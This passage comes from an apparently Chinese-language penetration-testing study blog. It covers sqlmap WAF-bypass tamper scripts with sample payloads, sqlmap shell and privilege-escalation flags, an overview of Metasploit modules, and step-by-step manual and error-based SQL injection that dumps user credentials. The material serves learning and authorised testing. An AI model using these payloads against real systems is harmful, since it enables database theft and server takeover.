class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：随机大小写 使用脚本前：tamper(<span class="hljs-string">&#x27;INSERT&#x27;</span>) 使用脚本后：INseRt<br><br>charunicodeencode.py<br>适用数据库：ASP、ASP.NET 测试通过数据库：Microsoft SQL Server <span class="hljs-number">2000</span>/<span class="hljs-number">2005</span>、MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>、PostgreSQL <span class="hljs-number">9.0</span><span class="hljs-number">.3</span> 作用：适用字符串的unicode编码 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD%20FROM TABLE&#x27;</span>) 使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045<br><br>space2comment.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：将空格替换为<span class="hljs-comment">/**/</span> 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT<span class="hljs-comment">/**/</span>id<span class="hljs-comment">/**/</span>FROM<span class="hljs-comment">/**/</span>users<br><br>equaltolike.py<br>测试通过数据库：Microsoft SQL Server <span class="hljs-number">2005</span>、MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span> 作用：将=替换为LIKE 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT * FROM users WHERE id=1&#x27;</span>) 使用脚本后：SELECT * FROM users WHERE id LIKE <span class="hljs-number">1</span><br><br>equaltolike.py<br>测试通过数据库：MySQL <span class="hljs-number">4</span>, <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span>、Oracle <span class="hljs-number">10</span>g、PostgreSQL <span class="hljs-number">8.3</span>, <span class="hljs-number">8.4</span>, <span class="hljs-number">9.0</span> 作用：将&gt;替换为GREATEST，绕过对&gt;的过滤 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND A &gt; B&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND GREATEST(A,B+<span class="hljs-number">1</span>)=A<br><br>ifnull2ifisnull.py<br>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly) 测试通过数据库：MySQL <span class="hljs-number">5.0</span> and <span class="hljs-number">5.5</span> 作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤 使用脚本前：tamper(<span class="hljs-string">&#x27;IFNULL(1, 2)&#x27;</span>) 使用脚本后：IF(ISNULL(<span class="hljs-number">1</span>),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br><br>modsecurityversioned.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.0</span> 作用：过滤空格，使用mysql内联注释的方式进行注入 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 2&gt;1--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> <span class="hljs-comment">/*!30874AND 2&gt;1*/</span>--<br><br>space2mysqlblank.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.1</span> 作用：将空格替换为其他空格符号(<span class="hljs-string">&#x27;%09&#x27;</span>, <span class="hljs-string">&#x27;%0A&#x27;</span>, <span class="hljs-string">&#x27;%0C&#x27;</span>, <span class="hljs-string">&#x27;%0D&#x27;</span>, <span class="hljs-string">&#x27;%0B&#x27;</span>) 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users&#x27;</span>) 使用脚本后：SELECT%0Bid%0DFROM%0Cusers<br><br>modsecurityzeroversioned.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">5.0</span> 作用：使用内联注释方式（<span class="hljs-comment">/*!00000*/</span>）进行注入 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 2&gt;1--&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> <span class="hljs-comment">/*!00000AND 2&gt;1*/</span>--<br><br>space2mysqldash.py<br>适用数据库：MySQL、MSSQL 作用：将空格替换为 -- ，并追随一个换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>--%0AAND--%0A9227=<span class="hljs-number">9227</span><br><br>bluecoat.py<br>适用数据库：Blue Coat SGOS 测试通过数据库：MySQL <span class="hljs-number">5.1</span>,、SGOS 作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换= 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT id FROM users where id = 1&#x27;</span>) 使用脚本后：SELECT%09id FROM users where id LIKE <span class="hljs-number">1</span><br><br>versionedkeywords.py<br>适用数据库：MySQL 测试通过数据库：MySQL <span class="hljs-number">4.0</span><span class="hljs-number">.18</span>, <span class="hljs-number">5.1</span><span class="hljs-number">.56</span>, <span class="hljs-number">5.5</span><span class="hljs-number">.11</span> 作用：注释绕过 使用脚本前：tamper(<span class="hljs-string">&#x27;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span><span class="hljs-comment">/*!UNION*/</span><span class="hljs-comment">/*!ALL*/</span><span class="hljs-comment">/*!SELECT*/</span><span class="hljs-comment">/*!NULL*/</span>,<span class="hljs-comment">/*!NULL*/</span>, CONCAT(CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">116</span>,<span class="hljs-number">58</span>),IFNULL(CAST(CURRENT_USER()<span class="hljs-comment">/*!AS*/</span><span class="hljs-comment">/*!CHAR*/</span>),CHAR(<span class="hljs-number">32</span>)),CHAR(<span class="hljs-number">58</span>,<span class="hljs-number">100</span>,<span class="hljs-number">114</span>,<span class="hljs-number">117</span>,<span class="hljs-number">58</span>))#<br><br>halfversionedmorekeywords.py<br>适用数据库：MySQL &lt; <span class="hljs-number">5.1</span> 测试通过数据库：MySQL <span class="hljs-number">4.0</span><span class="hljs-number">.18</span>/<span class="hljs-number">5.0</span><span class="hljs-number">.22</span> 作用：在每个关键字前添加mysql版本注释 使用脚本前：tamper(<span class="hljs-string">&quot;value&#x27; UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND &#x27;QDWa&#x27;=&#x27;QDWa&quot;</span>) 使用脚本后：value<span class="hljs-string">&#x27;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND &#x27;</span>QDWa<span class="hljs-string">&#x27;=&#x27;</span>QDWa<br><br>space2morehash.py<br>适用数据库：MySQL &gt;= <span class="hljs-number">5.1</span><span class="hljs-number">.13</span> 测试通过数据库：MySQL <span class="hljs-number">5.1</span><span class="hljs-number">.41</span> 作用：将空格替换为#，并添加一个随机字符串和换行符 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 9227=9227&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span>%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=<span class="hljs-number">9227</span><br><br>apostrophenullencode.py<br>适用数据库：ALL 作用：用非法双字节Unicode字符替换单引号 使用脚本前：tamper(<span class="hljs-string">&quot;1 AND &#x27;1&#x27;=&#x27;1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span> AND %00%271%00%27=%00%271<br><br>appendnullbyte.py<br>适用数据库：ALL 作用：在有效载荷的结束位置加载null字节字符编码 使用脚本前：tamper(<span class="hljs-string">&#x27;1 AND 1=1&#x27;</span>) 使用脚本后：<span class="hljs-number">1</span> AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span>%00<br><br>chardoubleencode.py<br>适用数据库：ALL 作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符） 使用脚本前：tamper(<span class="hljs-string">&#x27;SELECT FIELD FROM%20TABLE&#x27;</span>) 使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545<br><br>unmagicquotes.py<br>适用数据库：ALL 作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格 使用脚本前：tamper(<span class="hljs-string">&quot;1&#x27; AND 1=1&quot;</span>) 使用脚本后：<span class="hljs-number">1</span>%bf%27 AND <span class="hljs-number">1</span>=<span class="hljs-number">1</span>--<br><br>randomcomments.py<br>适用数据库：ALL 作用：用注释符分割sql关键字 使用脚本前：tamper(<span class="hljs-string">&#x27;INSERT&#x27;</span>) 使用脚本后：I<span class="hljs-comment">/**/</span>N<span class="hljs-comment">/**/</span>SERT<br></code></pre></td></tr></table></figure>
<p><strong>其他参数</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 漏洞探测等级（记住）</span><br>● <span class="hljs-comment">--level 5 漏洞探测等级（1-5）</span><br>  ○ <span class="hljs-comment">--level 1 默认的等级，会进行基本的测试，包括GET和POST方式 </span><br>  ○ <span class="hljs-comment">--level 2 在原有的基础上增加对cookie的检测 </span><br>  ○ <span class="hljs-comment">--level 3 增加对USER AGENT/REFERER的检测 （常用）</span><br>  ○ <span class="hljs-comment">--level 4 更多的payload来测试sql注入 </span><br>  ○ <span class="hljs-comment">--level 5 最高等级，包含所有的payload,会尝试自动破解出cookie、xff等头部注入（速度最慢）</span><br><br><span class="hljs-comment"># 显示信息（记住）</span><br>● -v 显示调试信息的<span class="hljs-number">7</span>个级别 （<span class="hljs-number">0</span><span class="hljs-number">-6</span>）<br>  ○ <span class="hljs-number">0</span>	只显示python错误以及严重的信息 (默认)<br>  ○ <span class="hljs-number">1</span>	同时显示基本信息和警告信息 <br>  ○ <span class="hljs-number">2</span>	同时显示debug信息 <br>  ○ <span class="hljs-number">3</span>	同时显示注入的payload （常用）<br>  ○ <span class="hljs-number">4</span>	同时显示<span class="hljs-keyword">http</span>请求 <br>  ○ <span class="hljs-number">5</span>	同时显示<span class="hljs-keyword">http</span>响应头 <br>  ○ <span class="hljs-number">6</span>	同时显示<span class="hljs-keyword">http</span>响应页面 <br><br><span class="hljs-comment"># 指定注入技术</span><br>基于布尔的盲注(B)：即可以根据返回页面判断条件的真假注入<br>基于时间的盲注(T)：既不能根据页面返回内容判断任何任何信息，用条件语句查看时间延迟语句是否执行(即页面返回时间是否增加)来判断<br>基于报错注入(E)：即页面返回错误信息，或者把注入的语句的结果直接返回页面中<br>联合查询注入(U)：可以使用<span class="hljs-built_in">union</span>的情况下的注入<br>堆叠查询注入(S)：可以同时执行多条语句的注入<br><br>注意：可以用<span class="hljs-comment">--technique来指定要使用哪种注入模式，快速扫描</span><br><span class="hljs-comment">--technique BEUST（可单独或混合指定注入模式进行快速扫描）</span><br><br><span class="hljs-comment"># --shell</span><br>要求权限：<span class="hljs-number">1.</span>管理员root <span class="hljs-number">2.</span>有绝对路径 <span class="hljs-number">3.</span>PHP自动转义GPC关闭 <span class="hljs-number">4.</span>secure_file_priv为空（重要！！！！！！！！！！！！！！！！！！！！！！）<br>	<span class="hljs-comment">--os-cmd		   执行操作系统命令                    //eg:--os-cmd=whoami</span><br>  <span class="hljs-comment">--os-shell     获取交互式的操作系统的shell   </span><br>  <span class="hljs-comment">--sql-shell    获取交互式的SQL执行环境</span><br>  <span class="hljs-comment">--sql-query    执行单个SQL语句                     //eg:--sql-query=&quot;select database()&quot;</span><br>  <span class="hljs-comment">--os-pwn       获取一个OOB Shell,Meterpreter或VNC</span><br>  <span class="hljs-comment">--os-smbrelay  一键获取一个OOBShell，Meterpreter或VNC</span><br>  <span class="hljs-comment">--os-bof       存储过程缓冲区溢出利用</span><br>  <span class="hljs-comment">--priv-esc     数据库进程用户权限提升</span><br>  <span class="hljs-comment">--msf-path=MSFPATH  MSF本地安装路径</span><br>  <span class="hljs-comment">--tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br></code></pre></td></tr></table></figure>
<img src="/posts/d62edc36/SQLmap.jpeg" class>
<h2 id="Metasploit之msf模块简介"><a class="header-anchor" href="#Metasploit之msf模块简介">¶</a>Metasploit之msf模块简介</h2>
<h3 id="1-Auxiliaries-辅助模块"><a class="header-anchor" href="#1-Auxiliaries-辅助模块">¶</a>1.Auxiliaries (辅助模块)</h3>
<p>该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</p>
<p>该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</p>
<h3 id="2-Exploit-漏洞利用模块"><a class="header-anchor" href="#2-Exploit-漏洞利用模块">¶</a>2.Exploit (漏洞利用模块)</h3>
<p>漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透攻击技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码。</p>
<h3 id="3-Payload-攻击载荷模块"><a class="header-anchor" href="#3-Payload-攻击载荷模块">¶</a>3.Payload (攻击载荷模块)</h3>
<p>攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等。</p>
<h3 id="4-Post-后期渗透模块"><a class="header-anchor" href="#4-Post-后期渗透模块">¶</a>4.Post (后期渗透模块)</h3>
<p>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</p>
<h3 id="5-Encoders-编码工具模块-特征被标记烂了"><a class="header-anchor" href="#5-Encoders-编码工具模块-特征被标记烂了">¶</a>5.Encoders (编码工具模块)(特征被标记烂了)</h3>
<p>该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来。</p>
<h3 id="问题-v2"><a class="header-anchor" href="#问题-v2">¶</a>问题</h3>
<p>​	BurpSuite如何抓 https 的包？</p>
<p>​	答：把BP的证书导出 , 然后添加到浏览器信任的根证书机构中</p>
<p>​	BurpSuite 如何抓外网的包?</p>
<p>​	答：在用户选项中设置顶级代理（上游代理）</p>
<h1>SQL注入</h1>
<h2 id="基础知识"><a class="header-anchor" href="#基础知识">¶</a>基础知识</h2>
<h3 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h3>
<p>**概念：**SQL注入（ SQL injection ）是一种将恶意代码插入到程序 SQL 语句中，从而误导数据库执行恶意逻辑的攻击技术。通过 SQL 注入，攻击者可以达到获取敏感信息，窃取访问权限等目的。sql注入属于服务端攻击 , 和操作系统和编程语言无关。</p>
<p>​		目标站点没有对<strong>用户在Web表单递交或输入域名的页面请求</strong>的查询字符串进行严格的过滤与验证导致拼接的SQL语句被带入到数据库执行从而获取数据库信息以及接管权限的WEB攻击漏洞！</p>
<p><strong>条件:</strong></p>
<ol>
<li>参数是用户可控的，也就是前端传入后端的参数的内容是用户可以控制的。</li>
<li>参数被带入数据库进行查询，也就是传入的参数被拼接到SQL语句中并被带入到数据库进行查询。</li>
</ol>
<h3 id="注入判断"><a class="header-anchor" href="#注入判断">¶</a>注入判断</h3>
<p>**顺序：**1.注入类型判断</p>
<p>​			2.闭合方式判断</p>
<p>​			3.判断是否存在注入</p>
<p>​			4.注入攻击</p>
<p><strong>类型判断：</strong></p>
<blockquote>
<p>区分数字和字符：</p>
<p>id = 1查看页面，默认页面。<br>
id = 2-1，如果它显示的出来的页面和id = 1的页面一样，我们就认为它是数字型。<br>
id = 2-1，如果它显示出来是id = 2的页面，我就认为它是字符型。4</p>
</blockquote>
<p>​		数字型注入：直接判断是否存在注入</p>
<p>​		字符型注入：使用单引号/双引号</p>
<blockquote>
<p>比如存在单引号注入的，在URL后添加一个单引号，页面回报错，因为单引号和前面的单引号闭合了导致语法错误，在再后面跟一个” --“页面恢复正常，因为原本代码中的单引号被注释掉了。</p>
</blockquote>
<p><strong>闭合方式判断（字符型）</strong></p>
<p><code>' </code> <code>&quot;</code>  <code>)</code> <code>')</code> <code>&quot;) </code>   <code>'))</code>  <code>&quot;))</code> <code>&#125;</code>等</p>
<p><strong>判断是否存在注入</strong></p>
<p>在闭合后与注释前进行逻辑判断，根据页面返回的结果来进行判断是否执行逻辑判断！</p>
<p>判断注入<br>
?id=1’     //报错<br>
?id=1’–+  //正常<br>
?id=1’and 1=1–+  //正常<br>
?id=1’and 1=2–+  //错误</p>
<p>逻辑与   and 1=1 (返回正常页面) --&gt; and 1=2 (返回错误页面,存在注入)<br>
逻辑或   or  1=1 (返回正常页面，存在注入) --&gt; or 1=2 (返回正常页面，存在注入)<br>
逻辑异或 xor 1=1(返回错误页面) --&gt; xor 1=2 (返回正常页面，存在注入)</p>
<p>在闭合后与注释前进行逻辑判断，根据页面返回的结果来进行判断是否执行逻辑判断！<br>
逻辑与   and 1=1 (返回正常页面) --&gt; and 1=2 (返回错误页面,存在注入)<br>
逻辑或   or  1=1 (返回正常页面，存在注入) --&gt; or 1=2 (返回正常页面，存在注入)<br>
逻辑异或 xor 1=1(返回错误页面) --&gt; xor 1=2 (返回正常页面，存在注入)</p>
<blockquote>
<p>如果页面都没有变化也可能是存在盲注。</p>
</blockquote>
<h3 id="注入流程（手工）"><a class="header-anchor" href="#注入流程（手工）">¶</a>注入流程（手工）</h3>
<blockquote>
<p>充分掌握手工注入方法以便在后续存在WAF的情况下进行绕过，而工具半自动化选择掌握SQLmap能够更有效率的实现Web攻击！</p>
</blockquote>
<ol>
<li><strong>判断字段数</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;order by 3--+  //正常</span><br><span class="hljs-string">?id=1&#x27;</span><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span><span class="hljs-comment">--+  //错误</span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>SQL语言中,order by 是一个常用的排序语句；默认升序(asc,从小到大)也可指定降序(desc,从大到小)<br>
eg:select * from users order by id desc;<br>
Group by 则是进行分组查询数据，其后面跟列名或字段数；</p>
</blockquote>
<ol start="2">
<li><strong>确定回显点</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UNION SELECT 1,2,3--+ </span><br></code></pre></td></tr></table></figure>
<blockquote>
<p><strong>union select联合查询的执行条件是前面的是false时才会去执行后面的语句</strong>，而id=-1不成立为false…</p>
</blockquote>
<ol start="3">
<li><strong>查询数据库相关信息</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),3--+</span><br></code></pre></td></tr></table></figure>
<ol start="4">
<li><strong>查询数据库下的表信息</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;--+  </span><br></code></pre></td></tr></table></figure>
<ol start="5">
<li><strong>查询表下的字段信息</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27;--+   </span><br></code></pre></td></tr></table></figure>
<ol start="6">
<li><strong>查询字段内容</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(username ,id , password) from users--+</span><br></code></pre></td></tr></table></figure>
<blockquote>
<p>补充：使用 sql 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过</p>
<p>函数解释：</p>
<p>concat(str1,str2)      	//没有分隔符的连接字符串<br>
concat_ws(str,str2)         	//含有分隔符的连接字符串<br>
group_concat(str1,str2)    //连接一个组的所有字符串，并以逗号分隔每一条数据</p>
</blockquote>
<h3 id="SQL注入危害"><a class="header-anchor" href="#SQL注入危害">¶</a>SQL注入危害</h3>
<p>**● 数据库信息泄露：**泄露数据库中存放的数据，用户隐私等；</p>
<p>**● 获取webshell：**当权限为root且知道绝对路径时，可以直接写入一句话木马到服务器</p>
<p>**● 网页篡改：**注入出后台管理员用户，登录后台发布恶意数据、篡改后台数据等；</p>
<p>**● 网站挂马：**当拿到webshell或者获取到服务器权限后，可将一些网页木马挂在服务器上，去攻击别人；</p>
<p>**● 获取系统权限：**当权限足够高时，可以获取系统主机的权限；</p>
<p>**● 万能密码：**利用特定的payload登录后台或其他页面；</p>
<p>**● 文件读取：**读取敏感文件…;</p>
<p><strong>SQL注入类型</strong></p>
<img src="/posts/d62edc36/1683710868825-3bcd85b4-887e-4ef2-8e61-685cef9d7fd9.png" class title="img">
<h3 id="基础SQL知识"><a class="header-anchor" href="#基础SQL知识">¶</a>基础SQL知识</h3>
<p><strong>information_schema库</strong></p>
<blockquote>
<p>在Mysql数据库5.0版本之后数据库的作用如下：其中information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。<strong>元数据是关于数据的数据</strong>，如数据库名或表名，列的数据类型，或访问权限等；并且在 MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等；</p>
</blockquote>
<ul>
<li>
<p>**information_schema：**是MySQL自带的数据库，主要保持MySQL数据库服务器的系统信息，比如数据库的名称，数据库表的名称，字段名称，存储权限等。</p>
<p>三个重要的表：</p>
<p>​	● <strong>information_schema.schemata</strong>:    该数据表存储了mysql数据库中	的所有数据库的库名</p>
<p>​		三个重要字段：</p>
<p>​			<strong>schema_name</strong>字段储存的就是数据库的名称(是当前数据库中的			所有数据库名称)。</p>
<p>​			<strong>tables</strong>表是用于储存所有表名，其中table_schema:字段是数据			库名称而table_name:字段是表名。</p>
<p>​			<strong>columns</strong> 表是储存字段名称，其中table_schema:字段是数据库			名称，而table_name:字段是表名最后column_name:字段是字			段名称。</p>
<p>​	● <strong>information_schema.tables</strong>：     该数据表存储了mysql数据库中	的所有数据表的表名<br>
​	● <strong>information_schema.columns</strong>:     该数据表存储了mysql数据库中	的所有列的列名</p>
</li>
<li>
<p>**performance_schema：**是MySQL系统自带的数据库，可以用来监控MySQL的各类性能指标。</p>
</li>
<li>
<p>**mysql：**保存MySQL的权限、参数、对象和状态信息。</p>
</li>
</ul>
<h3 id="各种注入"><a class="header-anchor" href="#各种注入">¶</a>各种注入</h3>
<h4 id="搜索注入"><a class="header-anchor" href="#搜索注入">¶</a>搜索注入</h4>
<p><strong>原理</strong></p>
<p>SQL语句原型：</p>
<p><code>SELECT * FROM 表名 WHERE 字段名 like '%d%'</code></p>
<p>like 支持类型<br>
Like主要支持两种通配符，分别是&quot;_“和”%&quot;。<br>
&quot;__&quot;代表匹配1个任意字符，常用于充当占位符；<br>
&quot;%&quot;代表匹配0个或多个任意字符。</p>
<p><strong>实操</strong></p>
<p>​		在搜索的内容后面添加单引号尝试闭合报错，在从单引号添加模糊匹配的百分号即&quot;%'&quot;在进行闭合成功</p>
<p>?name=hahaha’&amp;submit=搜索    //错误<br>
?name=hahaha%'–+&amp;submit=搜索   //正常</p>
<p>​		之后的处理方式和普通的联合注入相同，将联合注入语句放在<code>'</code>后。</p>
<h4 id="报错注入"><a class="header-anchor" href="#报错注入">¶</a>报错注入</h4>
<p><strong>原理</strong></p>
<p>​		报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用则首选报错注入；其报错注入利用的是数据库的报错信息得到数据库的内容，且还需要构造语句让数据库报错。</p>
<p><em>双查询</em><br>
一个查询语句包含一个查询语句，实际上是报错注入的一种；且需要联合着MYSQL的BUG报错来进行报错注入.</p>
<p><em>MySQL的BUG</em></p>
<p>rand() //随机函数   random</p>
<p>floor()   //取整数<br>
count()   //汇总函数<br>
group by  //分组语句<br>
BUG:当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分一错误形式显示出来<br>
select count(*),concat((select user()),(floor(rand() * 2))) as a from information_schema.tables group by a;</p>
<p><strong>报错注入函数</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">()</span></span>     其中原理主要是:xpath语法错误<br><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">floor</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exp</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">multipoint</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">polygon</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">linestring</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>
<p><strong>extractvalue()函数</strong></p>
<pre><code class="hljs">	 extractvalue(xml_frag,xpath_expr)函数接受两个参数，第一个为**XML标记内容**，也就是查询的内容，第二个为**XPATH路径**，也就是查询的路径。如果没有匹配内容，不管出于何种原因，只要 xpath_expr有效，并且 xml_frag由正确嵌套和关闭的元素组成 - 返回空字符串。不区分空元素的匹配和无匹配。但是如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容。
</code></pre>
<p>eg:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-built_in">substring</span>((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">5</span>))));<br></code></pre></td></tr></table></figure>
<p><strong>updatexml()函数</strong></p>
<p>​		updatexml(xml_target,xpath_expr,new_xml)接受三个参数，此函数将XML标记的给定片段的单个部分替换为xml_target新的XML片段new_xml，然后返回更改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。所有三个参数都应该是字符串。与extractvalue()类似，如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容。</p>
